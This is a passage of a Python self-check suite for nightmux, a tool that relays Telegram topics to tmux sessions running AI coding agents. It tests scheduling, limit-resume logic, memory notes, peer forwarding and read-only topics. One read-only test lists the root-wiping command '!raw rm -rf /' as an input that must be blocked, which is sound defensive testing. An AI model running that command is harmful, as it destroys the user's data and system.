"""nightmux's test suite: plain asserts that drive the real code, tmux included.

This file is not imported. `nightmux --selfcheck` (and CI) compiles it inside
nightmux's own namespace, so `selfcheck()` sees and can stub every module global
exactly as it did when it lived in nightmux.py.

    python3 nightmux.py --selfcheck      # ~75 s, must end with: selfcheck ok
"""
def selfcheck():
    # Pairing tests mint tokens: never into the live state dir the service reads.
    global PAIRED_TOKENS_FILE
    PAIRED_TOKENS_FILE = os.path.join(__import__("tempfile").mkdtemp(), "paired_tokens.json")
    globals()["CFG_PATH"] = os.path.join(FILE_DIR, "selfcheck.json")
    globals()["OFFSET_PATH"] = os.path.join(FILE_DIR, "selfcheck.offset")
    os.makedirs(FILE_DIR, exist_ok=True)
    globals()["STATE_DIR"] = os.path.join(FILE_DIR, "state")
    os.makedirs(STATE_DIR, exist_ok=True)
    box = ["╭────────╮", "│ > ", "╰────────╯", "  ? for shortcuts"]
    cfg, state, screen = {"topics": {}, "chat_id": -1}, {}, []
    sent = []
    globals()["send"] = lambda c, t, x, mode="mono", buttons=None, quiet=False: (
        sent.append(x), 77)[1]
    globals()["has_session"] = lambda s: True
    globals()["pane"] = lambda s: list(screen)
    globals()["visible"] = lambda s: list(screen)
    globals()["hooked"] = lambda s: False
    # A path that is never a directory, so snapshot_repo's git check is skipped
    # without shelling out — drain() calls it on every send, and the real
    # sess_cwd would otherwise block on a tmux pane that was never created here.
    globals()["sess_cwd"] = lambda s: "/nonexistent-nightmux-selfcheck"
    twice = lambda: (flush_new(cfg, state, "1", "s"), flush_new(cfg, state, "1", "s"))

    # Carried over from the sections that moved to tests/test_*.py: what the part
    # below still reads. ponytail: the legacy tail shares one session "s" and one office server.
    import io, tempfile
    typed, edits = [], []
    globals()["inject"] = lambda s, t: (typed.append(t), True)[1]   # typed it
    globals()["api"] = lambda c, m, **kw: edits.append((m, kw)) or {}
    cfg["topics"], cfg["verbose"] = {"1": "s"}, []
    screen[:] = ["● done", "⚠ Our servers are experiencing high traffic right now, please try again in a minute. "
                 "(UNAVAILABLE (code 503): No capacity available for model gemini-pro-agent on the server)"] + box
    st = state["s"] = {"asked_at": time.time(), "asked_msgs": [("1", 77)], "calls": 0, "calls_warned": False,
                       "changed": time.time(), "echo": {"and again"}, "last": "task for gemini",
                       "last_at": time.time(), "mode": "idle", "prev": list(screen), "prog_at": 0.0,
                       "prog_text": "", "queue": [], "ran": True, "react": None, "scr": list(screen),
                       "sent": list(screen), "snap": None, "spend": [], "turns": [time.time()] * 2,
                       "why": "trace=False prev=False mode=idle active=False"}
    tok = "123456789:AA" + "x" * 33
    ocfg = {"topics": {"5": "o"}, "topic_names": {"5": "proj"}, "started": {"5": "claude"},
            "bench": {"5": {"claude": "o", "codex": "o-codex", "agy": "o-agy"}}}
    ostate = {"o": {"mode": "busy", "prog_text": f"● Bash(export K={tok})", "queue": ["a"]}}
    import socket
    sock_ = socket.socket()
    sock_.bind(("127.0.0.1", 0))
    port_ = sock_.getsockname()[1]
    sock_.close()
    threading.Thread(target=run_webhook_server, daemon=True,
                     args=(ocfg, ostate, threading.Lock(), {1}, port_)).start()
    for _ in range(100):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{port_}/office").read()
            break
        except OSError:
            time.sleep(0.05)

    r2_ = {'days': 30,
          'at': time.time(),
          'took': 0.0,
          'agents': {'claude': {'sessions': 1,
                                'prompts': 30,
                                'requests': 30,
                                'tokens': {'input': 150,
                                           'cache_read': 300000,
                                           'cache_write': 2700000,
                                           'output': 3000,
                                           'thinking': 0},
                                'cache_hit': 0.1,
                                'avg_ctx': 100005,
                                'max_ctx': 100005,
                                'big_ctx': 0,
                                'avg_prompt': 16,
                                'nudge_pct': 0.5,
                                'nudges': [('continue', 15)],
                                'errors': 0,
                                'models': {'claude-x': 3003150},
                                'by_model': {'claude-opus-5-5': [1000000, 2000000, 400000, 100000]},
                                'daily': {'2026-11-16': [3000150, 30]}},
                     'agy': {'sessions': 1,
                             'prompts': 1,
                             'requests': 1,
                             'tokens': {'input': 1000,
                                        'cache_read': 2000,
                                        'cache_write': 0,
                                        'output': 150,
                                        'thinking': 0},
                             'cache_hit': 0.667,
                             'avg_ctx': 3000,
                             'max_ctx': 3000,
                             'big_ctx': 0,
                             'avg_prompt': 8,
                             'nudge_pct': 0.0,
                             'nudges': [],
                             'errors': 0,
                             'models': {'agy': 3150},
                             'by_model': {'agy': [1000, 2000, 0, 150]},
                             'daily': {}},
                     'codex': {'sessions': 1,
                               'prompts': 1,
                               'requests': 1,
                               'tokens': {'input': 100,
                                          'cache_read': 900,
                                          'cache_write': 0,
                                          'output': 50,
                                          'thinking': 0},
                               'cache_hit': 0.9,
                               'avg_ctx': 1000,
                               'max_ctx': 1000,
                               'big_ctx': 0,
                               'avg_prompt': 11,
                               'nudge_pct': 0.0,
                               'nudges': [],
                               'errors': 0,
                               'models': {'gpt-x': 1050},
                               'by_model': {'gpt-x': [100, 900, 0, 50]},
                               'daily': {}},
                     'opencode': {'sessions': 1,
                                  'prompts': 1,
                                  'requests': 1,
                                  'tokens': {'input': 500,
                                             'cache_read': 200,
                                             'cache_write': 0,
                                             'output': 100,
                                             'thinking': 0},
                                  'cache_hit': 0.286,
                                  'avg_ctx': 700,
                                  'max_ctx': 700,
                                  'big_ctx': 0,
                                  'avg_prompt': 13,
                                  'nudge_pct': 0.0,
                                  'nudges': [],
                                  'errors': 0,
                                  'models': {},
                                  'by_model': {},
                                  'daily': {}}},
          'tips': [{'agent': 'claude',
                    'tip': 'cache hit 10%: every pause past the cache TTL or model switch mid-session re-bills the '
                           'whole context. Work in fewer, longer sittings and keep one model per session'},
                   {'agent': 'claude',
                    'tip': 'each call carries 100k tokens of context (0 calls over 150k): /clear between unrelated '
                           'tasks, /compact sooner, keep CLAUDE.md/AGENTS.md lean, name the files instead of letting '
                           'it read the tree; !autocompact 150k also makes Claude compact itself mid-turn near 120k '
                           'instead of 170k'},
                   {'agent': 'claude',
                    'tip': "50% of prompts are nudges like 'continue'/'yes' — each one re-reads the full context to "
                           'do little. Give the whole plan with a done-condition up front, or queue steps with !shift '
                           '/ !plan'}],
          'when': {'projects': [('shop', 30)], 'at': {498559: 30}}}

    # Project memory: enough turns and a quiet spell ask the agent to rewrite the
    # notes; its reply is swallowed; a session started where notes exist reads them.
    msaid_ = []
    with tempfile.TemporaryDirectory() as md_, stubbed(
            send=lambda c, t, x, mode="mono", buttons=None, quiet=False: msaid_.append(x),
            save_cfg=lambda c: None):
        os.makedirs(os.path.join(md_, ".git", "info"))
        mcfg2_, mst2_ = {"topics": {"3": "m"}, "dirs": {"3": md_}}, {"m": {"mode": "idle", "changed": 0}}
        _mem.clear()
        for _ in range(MEM_TURNS):
            mem_capture(mcfg2_, "3", "m")
        mem_tick(mcfg2_, mst2_)
        assert mst2_["m"]["queue"] == [MEM_UPDATE] and _mem["3"]["wait"] == "m"
        assert ".nightmux/" in open(os.path.join(md_, ".git", "info", "exclude")).read()
        assert mem_reply_capture(mcfg2_, "3", "m", "memory updated") and "updated" in msaid_[-1]
        assert not mem_reply_capture(mcfg2_, "3", "m", "a normal answer")
        st3_ = {}
        mem_greet(mcfg2_, st3_, "3", "m2", md_)
        assert not st3_                                       # no notes yet: nothing to read
        open(os.path.join(md_, MEM_REL), "w").write("## What this is\nx")
        mem_greet(mcfg2_, st3_, "3", "m2", md_)
        assert st3_["m2"]["queue"] == [MEM_READ]
        mem_greet(mcfg2_, st3_, "3", "m2", md_)             # back to it: already read
        assert st3_["m2"]["queue"] == [MEM_READ]
        later_ = time.time() + 5
        os.utime(os.path.join(md_, MEM_REL), (later_, later_))
        mem_greet(mcfg2_, st3_, "3", "m2", md_)             # notes rewritten since
        assert st3_["m2"]["queue"] == [MEM_READ] * 2
        mem_greet(mcfg2_, st3_, "3", "m2", md_, fresh=True)  # new conversation, same name
        assert st3_["m2"]["queue"] == [MEM_READ] * 3
        with stubbed(tmux_git=lambda c, *a: "c0ffee"):        # a commit since: the notes may lag it
            mem_greet(mcfg2_, st3_, "3", "m2", md_)
            assert st3_["m2"]["queue"] == [MEM_READ] * 4
            mem_greet(mcfg2_, st3_, "3", "m2", md_)
            assert st3_["m2"]["queue"] == [MEM_READ] * 4
        # No change to the project since the last rewrite: no rewrite.
        _mem["3"] = {"turns": MEM_TURNS, "fp": "same"}
        mst2_["m"]["queue"] = []
        with stubbed(mem_print=lambda c: "same"):
            mem_tick(mcfg2_, mst2_)
        assert mst2_["m"]["queue"] == [] and _mem["3"]["turns"] == 0
        _mem["3"]["turns"] = MEM_TURNS
        with stubbed(mem_print=lambda c: "moved"):
            mem_tick(mcfg2_, mst2_)
        assert mst2_["m"]["queue"] == [MEM_UPDATE]
        mcfg2_["memory"] = {"3": "off"}
        mem_capture(mcfg2_, "3", "m")
        assert _mem["3"]["turns"] == 0
        _mem.clear()
    # Forecast: a rising window is projected to 100% before it resets; a new
    # window starts a new line; warned once, to topics actually on that agent.
    _fc.clear(); _fc_told.clear()
    t0_ = 1_700_000_000
    fc_sample({"claude:5h": (40, t0_ + 18000)}, t0_)
    fc_sample({"claude:5h": (60, t0_ + 18000)}, t0_ + 1800)          # +40%/h
    assert forecast("claude:5h", t0_ + 1800) == t0_ + 1800 + 3600     # 40% more: an hour
    fc_sample({"claude:5h": (5, t0_ + 36000)}, t0_ + 1900)            # reset: new window
    assert len(_fc["claude:5h"]["pts"]) == 1 and forecast("claude:5h") is None
    fsaid_ = []
    with stubbed(windows_now=lambda st: {"claude:5h": (80, None)}, installed_agents=lambda c: ["claude", "codex"],
                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False: fsaid_.append((t, x, buttons))):
        _fc.clear()
        _fc["claude:5h"] = {"resets": None, "pts": [(time.time() - 1800, 60)]}
        fcfg_ = {"topics": {"1": "a", "2": "b"}, "started": {"1": "claude", "2": "codex"}}
        _fc_at[0] = 0
        forecast_tick(fcfg_, {"a": {"mode": "busy"}, "b": {"mode": "busy"}})
        assert [t for t, _, _ in fsaid_] == ["1"] and "+40%/h" in fsaid_[0][1] and "!codex" in fsaid_[0][2]
        _fc_at[0] = 0
        forecast_tick(fcfg_, {"a": {"mode": "busy"}})
        assert len(fsaid_) == 1                                       # once per window
    _fc.clear(); _fc_told.clear()
    # !deps: findings sorted worst first, reported with the fix button; a clean
    # nightly run says nothing.
    r_ = {"vulns": [("moderate", "a", "x"), ("critical", "b", "RCE")],
          "outdated": [("phaser", "3.90.0", "4.2.1")], "notes": []}
    r_["vulns"].sort(key=lambda v: SEV.index(v[0]))
    rep_ = deps_report(r_)
    assert rep_.startswith("🩺 1 critical, 1 moderate vulnerabilities") and "phaser 3.90.0 → 4.2.1" in rep_, rep_
    assert "critical: b (RCE)" in deps_prompt(r_)
    dsaid_ = []
    with tempfile.TemporaryDirectory() as dd_, stubbed(
            deps_scan=lambda cwd: {"vulns": [], "outdated": [], "notes": []},
            send=lambda c, t, x, mode="mono", buttons=None, quiet=False: dsaid_.append(x)):
        deps_start({"dirs": {"4": dd_}}, "4", quiet=True)
        for _ in range(100):
            if "4" not in _deps_busy:
                break
            time.sleep(0.02)
        assert dsaid_ == []
    # Chat view: both directions are logged with their buttons, a reader asks
    # only for what is new, and the page and the PWA bits are served.
    _chat.clear()
    chat_log("5", "bot", "✅ done", kb([[("yes", "!y s")]]))     # what send() records
    chat_log("5", "you", "fix the cart")
    first_ = _chat["5"][0]
    assert first_["who"] == "bot" and first_["buttons"] == [[{"text": "yes", "data": "!y s", "url": None}]], _chat["5"]
    cj_ = json.loads(urllib.request.urlopen(f"http://127.0.0.1:{port_}/api/chat/5?after={first_['id']}").read())
    assert [m["text"] for m in cj_["items"]] == ["fix the cart"], cj_
    assert "message the agent" in urllib.request.urlopen(f"http://127.0.0.1:{port_}/chat?t=5").read().decode()
    assert json.loads(urllib.request.urlopen(f"http://127.0.0.1:{port_}/manifest.json").read())["display"] == "standalone"
    for _ in range(CHAT_KEEP + 5):
        chat_log("5", "bot", "x")
    assert len(_chat["5"]) == CHAT_KEEP
    _chat.clear()
    # Briefing: done / waiting / limits / today, from the pieces nightmux already
    # tracks; nothing to say in a section says so in one line.
    with stubbed(reel_caption=lambda c, s: ["game: 3 commits, +120 −14"],
                 topics_status=lambda c, s: [
                     {"topic": "1", "session": "g", "mode": "waiting", "queued": 2, "held_until": None},
                     {"topic": "2", "session": "h", "mode": "idle", "queued": 0, "held_until": time.time() + 600}],
                 windows_now=lambda st: {"claude:5h": (40, None)}, gh=lambda *a, **k: "[]"):
        _err_log[:] = [(time.time(), "1", "TypeError: x")]
        bt_ = briefing_text({"topic_names": {"1": "Game"}, "topics": {}}, {}, time.time() - 3600)
    for part_ in ("game: 3 commits", "✋ asking you: Game", "1 production error", "claude:5h 40%",
                  "📥 queued: Game 2", "💤 held: h until"):
        assert part_ in bt_, (part_, bt_)
    _err_log.clear()
    with stubbed(save_cfg=lambda c: None):
        bc_ = {}
        assert "07:30" in briefing_cmd(bc_, {}, threading.Lock(), "4", "07:30")
        assert bc_["briefing"] == {"at": "07:30", "topic": "4"}
        briefing_cmd(bc_, {}, threading.Lock(), "4", "off")
        assert "briefing" not in bc_
    # Two servers: the primary forwards a remote topic's update, untouched, to
    # the peer that runs it; the peer serves /peer/ to the secret and nothing else.
    sec_ = "k" * 24
    pcfg_ = {"chat_id": -5, "topics": {"77": "w1"}, "started": {"77": "claude"},
             "peer_secret": sec_}
    sock_ = socket.socket()
    sock_.bind(("127.0.0.1", 0))
    pport_ = sock_.getsockname()[1]
    sock_.close()
    threading.Thread(target=run_webhook_server, daemon=True, kwargs={"peer_only": True},
                     args=(pcfg_, {"w1": {"mode": "idle"}}, threading.Lock(), {1}, pport_)).start()
    prim_ = {"chat_id": -5, "topics": {}, "remote": {"77": "box2"},
             "peers": {"box2": {"url": f"http://127.0.0.1:{pport_}", "secret": sec_}}}
    for _ in range(100):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{pport_}/")
        except urllib.error.HTTPError as e:
            assert e.code == 404           # the dashboard is not served to the tailnet
            break
        except OSError:
            time.sleep(0.05)
    bad_ = dict(prim_, peers={"box2": dict(prim_["peers"]["box2"], secret="x" * 24)})
    assert peer_call(bad_, "box2", "api/topics") is None          # 403
    with stubbed(live_sessions=lambda: {"w1": 1}):
        rows_ = with_peers(prim_, "/api/topics", [])
    assert [(r["topic"], r["server"]) for r in rows_] == [("77", "box2")], rows_
    got_, real_process = [], process
    upd_ = {"update_id": 9, "message": {"message_thread_id": 77, "text": "hello",
                                        "chat": {"id": -5}, "from": {"id": 1}}}
    with stubbed(process=lambda c, st, l, a, u: got_.append((c is pcfg_, u))):
        real_process(prim_, {}, threading.Lock(), {1}, upd_)
        for _ in range(100):
            if got_:
                break
            time.sleep(0.02)
    assert got_ and got_[0][0] and got_[0][1]["_peer"] and \
        got_[0][1]["message"]["text"] == "hello", got_
    psent_ = []
    with stubbed(send=lambda c, t, x, mode="mono", buttons=None, quiet=False: psent_.append(x),
                 save_cfg=lambda c: None):
        gone_ = dict(prim_, peers={"box2": {"url": "http://127.0.0.1:1", "secret": sec_}})
        real_process(gone_, {}, threading.Lock(), {1}, upd_)
        assert "did not answer" in psent_[-1], psent_
        lk_ = threading.Lock()
        assert "box2" in handle(prim_, {}, lk_, "77", "!server")
        assert "!unbind" in handle(dict(prim_, topics={"78": "x"}), {}, lk_, "78", "!server box2")
        assert "no peer" in handle(prim_, {}, lk_, "78", "!server nope")
        mv_ = dict(prim_, remote={})
        handle(mv_, {}, lk_, "78", "!server box2")
        assert peer_of(mv_, "78") == "box2"
        handle(mv_, {}, lk_, "78", "!server local")
        assert peer_of(mv_, "78") is None
        prim_named_ = dict(mv_, name="vps1")
        handle(prim_named_, {}, lk_, "78", "!server BOX2")
        assert peer_of(prim_named_, "78") == "box2"
        handle(prim_named_, {}, lk_, "78", "!server vps1")
        assert peer_of(prim_named_, "78") is None
    base = 1700000000                             # fixed instant: no clock races
    assert at_epoch({}, "+2h", base) == base + 7200
    nxt = at_epoch({}, "03:00", base)
    assert 0 < nxt - base <= 86400 and time.gmtime(nxt).tm_hour == 3
    assert at_epoch({}, "garbage", base) is None
    st["queue"], st["sched"] = [], [
        {"at": time.time() - 1, "every": None, "text": "one-off"},
        {"at": time.time() - 1, "every": 3600, "text": "recurring"}]
    due(cfg, state, "1", "s")
    assert st["queue"] == ["one-off", "recurring"], st["queue"]
    assert [j["text"] for j in st["sched"]] == ["recurring"]   # one-off is spent
    assert st["sched"][0]["at"] > time.time() + 3500   # rearmed from now, so a
    sched_n = len(sent)                                # daemon that was off does
    due(cfg, state, "1", "s")                          # not fire a backlog at once
    assert len(sent) == sched_n
    assert queue_blob({"s": st})["s"]["sched"]         # and it survives a restart
    st["queue"] = []
    out = handle(cfg, state, threading.Lock(), "1", "!at +1h check the build")
    assert out.startswith("⏰") and st["sched"][-1]["text"] == "check the build"
    assert handle(cfg, state, threading.Lock(), "1", "!sched").startswith("1.")
    assert handle(cfg, state, threading.Lock(), "1", "!at nonsense").startswith("usage:")
    assert handle(cfg, state, threading.Lock(), "1", "!sched clear") == \
        "dropped 2 scheduled prompt(s)"
    st.pop("sched")

    # !digest: on demand reuses !cost/!git plumbing; scheduling rides !every's
    # epoch math, but a fired job reports directly rather than typing "!digest"
    # into the agent the way an ordinary scheduled prompt would.
    st["snap"] = {}
    out = handle(cfg, state, threading.Lock(), "1", "!digest")
    assert out.startswith("🌙 digest · s"), out
    sched_out = handle(cfg, state, threading.Lock(), "1", "!digest 08:00")
    assert sched_out.startswith("digest daily at") and \
        any(j.get("kind") == "digest" for j in st["sched"]), sched_out
    assert handle(cfg, state, threading.Lock(), "1", "!digest off") == \
        "digest schedule cancelled"
    assert handle(cfg, state, threading.Lock(), "1", "!digest off") == \
        "no digest scheduled"
    assert handle(cfg, state, threading.Lock(), "1", "!digest nonsense") \
        .startswith("usage:")
    st["sched"] = [{"at": time.time() - 1, "every": 3600, "kind": "digest",
                    "text": "!digest", "since": time.time() - 3600}]
    st["queue"], n = [], len(sent)
    due(cfg, state, "1", "s")
    assert st["queue"] == [] and len(sent) == n + 1     # a report, never a typed prompt
    assert sent[-1].startswith("🌙 digest · s"), sent[-1]
    assert st["sched"][0]["since"] > time.time() - 5
    assert st["sched"][0]["at"] > time.time() + 3500    # rearmed for the next window
    st.pop("sched"), st.pop("snap")

    # !shift: sequential overnight plan, drained like the queue one idle turn at
    # a time — reuses drain()'s own idle/lockout gate instead of a second one.
    out = handle(cfg, state, threading.Lock(), "1", "!shift\nfirst step\nsecond step")
    assert out.startswith("shift set: 2 step(s)") and "first step" in out, out
    assert st["shift"] == ["first step", "second step"] and st["shift_total"] == 2
    assert handle(cfg, state, threading.Lock(), "1", "!shift").startswith("shift 0/2")
    st["mode"], t = "busy", len(typed)
    drain(cfg, state, "1", "s")                # busy pane: a shift step never fires
    assert len(typed) == t and st["shift"] == ["first step", "second step"]
    st["mode"], n = "idle", len(sent)
    drain(cfg, state, "1", "s")
    assert typed[-1] == "first step" and st["shift"] == ["second step"], typed
    assert sent[n].startswith("🌙 shift 1/2 → first step"), sent[n:]
    n = len(sent)
    drain(cfg, state, "1", "s")
    assert typed[-1] == "second step"
    assert "shift" not in st and "shift_total" not in st
    assert sent[n] == "🌙 shift 2/2 → second step", sent[n:]
    assert "🌙 s shift done" in sent[n:], sent[n:]
    assert handle(cfg, state, threading.Lock(), "1", "!shift") == \
        "no shift plan · !shift then one prompt per line"
    handle(cfg, state, threading.Lock(), "1", "!shift one two three")  # single line: one step
    assert st["shift"] == ["one two three"], st["shift"]
    assert handle(cfg, state, threading.Lock(), "1", "!shift clear") == \
        "shift cleared (1 step(s) dropped)"
    assert "shift" not in st

    # A turn cut off mid-flight has nothing left in the queue to bring it back,
    # so the hold queues its own continuation and the ordinary drain runs it.
    st["mode"], st["queue"], typed[:] = "busy", [], []
    st.pop("last", None)                          # nothing typed just before it
    st["snap"] = {"ts": time.time(),
                  "five_hour": {"used_percentage": 100, "resets_at": time.time() + 5}}
    check_limit(cfg, st, "1", "s", screen, False, True)
    assert st["queue"] == ["continue"] and "resuming itself" in sent[-1], sent[-1]
    st["mode"], st["limit_until"] = "idle", time.time() - 1
    drain(cfg, state, "1", "s")
    assert typed == ["continue"] and st["queue"] == [], typed
    st.pop("limit_line", None), st.pop("prog_msg", None)
    # That resume landed on a window that was still shut: the prompt it just sent
    # never got a turn, so it goes back rather than being lost to the refusal.
    st["queue"], st["limit_line"] = [], None
    check_limit(cfg, st, "1", "s", screen, False, False)
    assert st["queue"] == ["continue"], st["queue"]
    st["queue"], st["limit_line"] = [], None      # an idle session with nothing
    st.pop("last")                                # outstanding is left alone
    check_limit(cfg, st, "1", "s", screen, False, False)
    assert st["queue"] == [] and st["limit_until"] > time.time()
    st.pop("limit_until"), st.pop("limit_line")
    # A prompt refused the moment it was typed did no work: it goes back whole,
    # rather than a `continue` that would resume nothing.
    st["mode"], st["queue"] = "busy", []
    st["last"], st["last_at"], st["ran"] = "the refused prompt", time.time(), False
    check_limit(cfg, st, "1", "s", screen, False, True)
    assert st["queue"] == ["the refused prompt"], st["queue"]
    # ...and it does not need a busy pane to notice, because a prompt that was
    # refused is exactly the case where nothing was running to see it.
    st["queue"], st["limit_line"] = [], None
    check_limit(cfg, st, "1", "s", screen, False, False)
    assert st["queue"] == ["the refused prompt"], st["queue"]
    # A prompt whose turn did run is a different thing, and must not be re-sent.
    st["queue"], st["limit_line"], st["ran"] = [], None, True
    check_limit(cfg, st, "1", "s", screen, False, False)
    assert st["queue"] == [], st["queue"]
    st["ran"], st["queue"] = False, ["the refused prompt"]   # for what follows
    # ...and a window that reopens onto a pane that cannot take it says so, once,
    # instead of looking like a hold that never lifted.
    st["mode"], st["limit_until"], n = "busy", time.time() - 1, len(sent)
    drain(cfg, state, "1", "s")
    assert "1 queued, but the pane is busy" in sent[-1], sent[-1]
    drain(cfg, state, "1", "s")
    assert len(sent) == n + 1 and st["queue"] == ["the refused prompt"]
    for k in ("snap", "queue", "last", "last_at", "resumed", "limit_line"):
        st.pop(k, None)

    # The turn is open until its output lands, and the pane reads idle for the
    # tick or two between a refusal and the status line admitting the window is
    # spent — so the live trace, not the pane's mode, is what says work was cut.
    st["mode"], st["queue"], screen[:] = "idle", [], ["● done"] + box
    st["prog_msg"], st["snap"] = 77, {
        "ts": time.time(),
        "five_hour": {"used_percentage": 100, "resets_at": time.time() + 5}}
    st.pop("last", None), st.pop("limit_line", None)
    with stubbed(snapshot=lambda p: st["snap"]):
        flush_new(cfg, state, "1", "s")
    assert st["queue"] == ["continue"], st["queue"]
    # The same, for a session driven from its own terminal: no prompt of ours was
    # typed, so no live trace exists and the pane can read idle at the very tick
    # the window is found spent. A transcript that grew seconds ago is the turn.
    for k in ("queue", "limit_until", "limit_line", "prog_msg"):
        st.pop(k, None)
    st["mode"], st["last_gain"] = "idle", time.time()
    with stubbed(snapshot=lambda p: st["snap"]):
        flush_new(cfg, state, "1", "s")
    assert st["queue"] == ["continue"], st["queue"]
    st["last_gain"] = time.time() - ACTIVE_RECENT - 1   # ...but not hours later
    for k in ("queue", "limit_until", "limit_line"):
        st.pop(k, None)
    with stubbed(snapshot=lambda p: st["snap"]):
        flush_new(cfg, state, "1", "s")
    assert not st.get("queue"), st.get("queue")
    st.pop("last_gain")
    for k in ("queue", "limit_until", "limit_line", "prog_msg", "snap"):
        st.pop(k, None)

    # A banner that is merely still on screen is not a new limit: only what the
    # tick actually gained is evidence, or every resume re-holds on its own past.
    st["mode"], screen[:] = "idle", ["You've hit your 5-hour limit · resets in 1h 0m"]
    flush_new(cfg, state, "1", "s")                # first sight: a real hold
    assert st["limit_until"] > time.time() and st.get("queue") is None
    st.pop("limit_until")
    flush_new(cfg, state, "1", "s")                # same screen, nothing gained
    assert "limit_until" not in st
    st.pop("limit_line", None)

    # Menus disagree about Enter, so the answer is checked rather than assumed.
    keys, calls = [], []
    screen[:] = ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]
    assert menu_digit(screen, YES_NO["!y"]) == "1"    # "y" would go nowhere here
    assert menu_digit(screen, YES_NO["!n"]) == "2"
    with stubbed(tmux=lambda *a: keys.append(a[-1]), CONFIRM_AFTER=0.3):
        press("s", "1", confirm=True)             # menu still up: the digit alone
        assert keys == ["1", "Enter"], keys        # only moved the highlight
        keys[:] = []
        with stubbed(visible=lambda s: (calls.append(1),
                                        list(screen) if len(calls) < 2
                                        else ["● done", "esc to interrupt"])[1]):
            press("s", "1", confirm=True)         # the dialog acted on the digit:
        assert keys == ["1"], keys                 # a stray Enter would answer the
    screen[:] = ["● done"] + box                  # next question for you

    handle(cfg, state, threading.Lock(), "1", "another one", mid=555)  # prompt ticked
    assert ("setMessageReaction", 555) in [(m, k.get("message_id")) for m, k in edits]
    assert st["react"] == 555 and st["prog_msg"] == 77
    screen[:] = ["● done", "● and the answer"] + box
    twice()
    assert "react" not in st, st
    assert json.loads(edits[-1][1]["reaction"])[0]["emoji"] == DONE, edits[-1]

    assert handle(cfg, state, threading.Lock(), "1", "/topics") == status_report(cfg, state)
    assert handle(cfg, state, threading.Lock(), "1", "/pane 5") is not None  # alias -> !pane
    assert {c["command"] for c in
            [{"command": c} for c in TG_SLASH]} & {c for c, _ in PASSTHRU} == set()
    n, t = len(sent), len(typed)                  # kill asks before it kills
    assert handle(cfg, state, threading.Lock(), "1", "!kill") is None
    assert sent[-1].startswith("⚠️ kill tmux session 's'?"), sent[-1]
    assert cfg["topics"].get("1") == "s"          # nothing killed, still bound
    assert handle(cfg, state, threading.Lock(), "1", "!cancel") == "cancelled"
    # A read-only topic reports and searches, and never reaches the keyboard.
    cfg["modes"], ro_typed = {"1": "readonly"}, len(typed)
    for blocked in ("hello there", "!raw rm -rf /", "!1", "!kill", "!new x",
                    "!queue now", "!claude"):
        assert handle(cfg, state, threading.Lock(), "1", blocked).startswith("🔒"), blocked
    assert len(typed) == ro_typed and cfg["topics"].get("1") == "s"   # nothing typed
    assert handle(cfg, state, threading.Lock(), "1", "!status") == status_report(cfg, state)
    assert handle(cfg, state, threading.Lock(), "1", "!queue").startswith("0 queued")
    cfg.pop("modes")                              # full again for what follows
    assert handle(cfg, state, threading.Lock(), "1", "!queue clear") is not None
    # An unhandled !command is typed into the session as text, so the cancel
    # button has to be a real command or declining would inject "!cancel".
    assert len(sent) == n + 1 and len(typed) == t, (sent[n:], typed[t:])
    screen[:] = ["● done"] + box
    assert handle(cfg, state, threading.Lock(), "1", "next task") is None
    assert typed[-1] == "next task", typed

    # !center: binds a topic to control every session, never to one of them.
    assert cfg.get("center_topic") is None
    out = handle(cfg, state, threading.Lock(), "501", "!center")
    assert out == "this topic is now the command center — try !board", out
    assert cfg["center_topic"] == "501" and "501" not in cfg["topics"]
    out2 = handle(cfg, state, threading.Lock(), "502", "!center")
    assert out2 == "command center moved here from topic 501", out2
    assert cfg["center_topic"] == "502" and "502" not in cfg["topics"]
    # A center topic controls, it does not converse — plain text and an
    # unrecognised command both point at !board instead of erroring or typing.
    assert handle(cfg, state, threading.Lock(), "502", "hello there") == \
        "this topic controls every session — try !board"
    assert handle(cfg, state, threading.Lock(), "502", "!bogus") == \
        "this topic controls every session — try !board"
    assert handle(cfg, state, threading.Lock(), "502", "!center off") == \
        "command center off"
    assert cfg.get("center_topic") is None
    assert handle(cfg, state, threading.Lock(), "502", "!center off") == \
        "no command center was set"

    # !board reuses !status's own classification rather than reclassifying.
    board = handle(cfg, state, threading.Lock(), "1", "!board")
    assert status_report(cfg, state) in board, board

    # !all: fan-out reuses send_prompt, echoes who it hit before sending, and
    # a readonly-bound or missing target is skipped, never typed into.
    cfg["topics"]["9"] = "other"
    state.setdefault("other", {})
    assert handle(cfg, state, threading.Lock(), "1", "!all").startswith("usage:")
    n, sent_n = len(typed), len(sent)
    out3 = handle(cfg, state, threading.Lock(), "1", "!all s,other broadcast one")
    assert out3 is None
    echo = sent[sent_n]
    assert echo.startswith("📣 !all → ") and "s" in echo and "other" in echo, echo
    assert typed[n:] == ["broadcast one", "broadcast one"], typed[n:]
    cfg["modes"] = {"9": "readonly"}
    n, sent_n = len(typed), len(sent)
    handle(cfg, state, threading.Lock(), "1", "!all --all skip-ro")
    echo2 = sent[sent_n]
    head, _, tail = echo2.partition("\n(skipped:")
    assert "other" not in head and "s" in head, echo2
    assert "other (read-only)" in tail, echo2
    assert typed[n:] == ["skip-ro"], typed[n:]        # only s got it
    cfg.pop("modes")
    n, sent_n = len(typed), len(sent)
    handle(cfg, state, threading.Lock(), "1", "!all bogus,s hi-there")
    echo3 = sent[sent_n]
    assert "bogus (not bound)" in echo3 and "s" in echo3.split("\n")[0], echo3
    assert typed[n:] == ["hi-there"], typed[n:]
    out4 = handle(cfg, state, threading.Lock(), "1", "!all bogus2 nope")
    assert out4.startswith("nothing to send to"), out4

    # !digest from the command center loops every bound topic instead of one.
    handle(cfg, state, threading.Lock(), "1", "!center")
    assert cfg["center_topic"] == "1"
    state["s"]["snap"], state["other"]["snap"] = {}, {}
    dig = handle(cfg, state, threading.Lock(), "1", "!digest")
    assert dig.count("🌙 digest ·") == 2 and "s" in dig and "other" in dig, dig
    assert handle(cfg, state, threading.Lock(), "1", "!digest 09:00") == \
        "!digest here is report-only — schedule it from each session's own topic"
    state["s"].pop("snap"), state["other"].pop("snap")
    cfg["topics"].pop("9"), state.pop("other")

    # A pending approval mirrors into the command center; whichever copy is
    # tapped first resolves it under the shared lock, and the other has
    # nothing left to press — no duplicate keystroke lands in the pane.
    st = state["s"]
    cfg["center_topic"] = "999"                    # distinct from "1": a real mirror
    st.pop("asked", None), st.pop("asked_msgs", None)
    sent_n = len(sent)
    ok = ask(cfg, st, "1", "s", "proceed?", ["Do you want to proceed?",
